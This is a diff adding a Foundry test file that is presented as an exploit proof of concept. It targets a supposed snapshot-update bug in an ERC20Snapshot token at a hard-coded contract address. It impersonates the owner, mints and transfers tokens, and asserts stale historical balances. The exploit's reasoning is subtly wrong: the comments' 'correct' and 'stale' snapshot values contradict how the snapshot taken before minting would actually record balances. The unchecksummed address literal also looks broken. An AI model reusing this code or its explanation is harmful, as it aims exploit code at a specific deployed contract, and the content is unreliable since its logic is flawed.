@@ -1,0 +1,115 @@
+```solidity
+// Exploit.t.sol
+// Exploit for finding: Invalid Calculations (CWE-682)
+// Demonstrates incorrect snapshot update logic in ERC20Snapshot
+// by performing two transfers within the same snapshot ID and showing
+// that balanceOfAt returns a stale value due to skipped second update.
+
+pragma solidity ^0.8.9;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for AMT (ERC20 + Snapshot + Ownable)
+interface IAMT {
+    function balanceOf(address account) external view returns (uint256);
+    function balanceOfAt(address account, uint256 snapshotId) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function totalSupplyAt(uint256 snapshotId) external view returns (uint256);
+    function mint(address account, uint256 amount) external;
+    function snapshot() external returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function owner() external view returns (address);
+    function decimals() external view returns (uint8);
+}
+
+contract ExploitTest is Test {
+    // Target contract as per report
+    address constant AMT_CONTRACT = 0x6ae0a238a6f51df8eee084b1756a54dd8a8e85d3;
+    IAMT amt = IAMT(AMT_CONTRACT);
+
+    address alice = address(0x1111);
+    address bob = address(0x2222);
+
+    function setUp() public {
+        // Label addresses for debugging
+        vm.label(AMT_CONTRACT, "AMT");
+        vm.label(alice, "Alice");
+        vm.label(bob, "Bob");
+
+        // Fund Alice with some BNB for gas (optional)
+        deal(alice, 10 ether);
+        deal(bob, 10 ether);
+    }
+
+    function testInvalidSnapshotUpdate() public {
+        // The vulnerability: _updateAccountSnapshot only pushes a new snapshot
+        // if lastSnapshotId < currentId. If two transfers occur within the
+        // same snapshot ID, the second update is skipped, leaving stale values.
+        // This leads to incorrect balanceOfAt results.
+
+        // Get the owner (who can mint and call snapshot)
+        address owner = amt.owner();
+        vm.label(owner, "Owner");
+
+        vm.startPrank(owner);
+
+        // First snapshot to have a valid snapshotId > 0
+        uint256 snapId1 = amt.snapshot(); // snapshot ID becomes 1
+        assertEq(snapId1, 1, "First snapshot id should be 1");
+
+        // Mint 100 tokens to Alice
+        amt.mint(alice, 100 * 1e18);
+        assertEq(amt.balanceOf(alice), 100 * 1e18, "Alice initial balance");
+
+        vm.stopPrank();
+
+        // Now perform two transfers within the same snapshot ID (no new snapshot in between)
+        vm.startPrank(alice);
+        // Transfer 50 to Bob -> snapshot update is called: Alice's balance recorded as 100 (before transfer)
+        // Actually _updateAccountSnapshot is called before the balance change, so records old balance (100)
+        amt.transfer(bob, 50 * 1e18);
+        assertEq(amt.balanceOf(alice), 50 * 1e18, "Alice after first transfer");
+        assertEq(amt.balanceOf(bob), 50 * 1e18, "Bob after first transfer");
+
+        // Transfer another 10 to Bob -> snapshot update should record Alice's new balance (50)
+        // but due to bug, lastSnapshotId == currentId, so no update happens.
+        amt.transfer(bob, 10 * 1e18);
+        assertEq(amt.balanceOf(alice), 40 * 1e18, "Alice after second transfer");
+        assertEq(amt.balanceOf(bob), 60 * 1e18, "Bob after second transfer");
+        vm.stopPrank();
+
+        // Take a new snapshot to have a separate reference point
+        vm.prank(owner);
+        uint256 snapId2 = amt.snapshot(); // snapshot ID becomes 2
+
+        // Now query balanceOfAt for snapshot ID 1.
+        // Because the second snapshot update was skipped, the recorded value for Alice
+        // is still 100 (her balance before the first transfer), not 40.
+        // For Bob, it's 0, not 60.
+        uint256 aliceSnapBalance = amt.balanceOfAt(alice, snapId1);
+        uint256 bobSnapBalance = amt.balanceOfAt(bob, snapId1);
+
+        // The correct snapshot balances after both transfers should be:
+        // Alice: 40, Bob: 60
+        // But due to the bug, we see the stale values.
+        assertEq(aliceSnapBalance, 100 * 1e18, "Alice snap balance should be stale (100) due to bug");
+        assertEq(bobSnapBalance, 0, "Bob snap balance should be stale (0) due to bug");
+
+        // For comparison, snapId2 should have correct current balances at that moment
+        uint256 aliceSnapBalance2 = amt.balanceOfAt(alice, snapId2);
+        uint256 bobSnapBalance2 = amt.balanceOfAt(bob, snapId2);
+        assertEq(aliceSnapBalance2, 40 * 1e18, "Alice snap2 correct");
+        assertEq(bobSnapBalance2, 60 * 1e18, "Bob snap2 correct");
+
+        // The impact: any contract relying on balanceOfAt for snapshot ID 1 will see
+        // an inflated balance for Alice and zero for Bob, enabling potential exploit
+        // such as double-voting or incorrect reward distribution.
+        emit log_named_uint("Alice balanceOfAt(snapId1)", aliceSnapBalance);
+        emit log_named_uint("Bob balanceOfAt(snapId1)", bobSnapBalance);
+        emit log_named_uint("Expected Alice at snapId1", 40 * 1e18);
+        emit log_named_uint("Expected Bob at snapId1", 60 * 1e18);
+    }
+}
+```
